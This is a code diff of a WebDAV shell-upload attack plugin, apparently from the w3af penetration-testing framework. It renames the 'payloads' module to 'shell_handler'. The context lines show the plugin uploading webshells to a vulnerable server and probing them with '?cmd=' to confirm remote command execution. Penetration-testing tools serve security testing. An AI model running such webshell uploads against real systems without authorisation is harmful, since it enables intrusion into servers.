@@ -35,7 +35,7 @@ from core.data.kb.shell import shell as shell
 import core.data.parsers.urlParser as urlParser
 from core.controllers.w3afException import w3afException
 
-import plugins.attack.payloads.payloads as payloads
+import plugins.attack.payloads.shell_handler as shell_handler
 import urllib
 
 
@@ -110,7 +110,7 @@ class davShell(baseAttackPlugin):
         extension = urlParser.getExtension( vuln_obj.getURL() )
         
         # I get a list of tuples with file_content and extension to use
-        shell_list = payloads.get_webshells( extension )
+        shell_list = shell_handler.get_webshells( extension )
         
         for file_content, real_extension in shell_list:
             if extension == '':
@@ -125,11 +125,11 @@ class davShell(baseAttackPlugin):
             # Verify if I can execute commands
             # All w3af shells, when invoked with a blank command, return a 
             # specific value in the response:
-            # payloads.SHELL_IDENTIFIER
+            # shell_handler.SHELL_IDENTIFIER
             response = self._urlOpener.GET( url_to_upload + '?cmd=' )
-            if payloads.SHELL_IDENTIFIER in response.getBody():
+            if shell_handler.SHELL_IDENTIFIER in response.getBody():
                 msg = 'The uploaded shell returned the SHELL_IDENTIFIER: "'
-                msg += payloads.SHELL_IDENTIFIER + '".'
+                msg += shell_handler.SHELL_IDENTIFIER + '".'
                 om.out.debug( msg )
                 self._exploit_url = url_to_upload + '?cmd='
                 return True
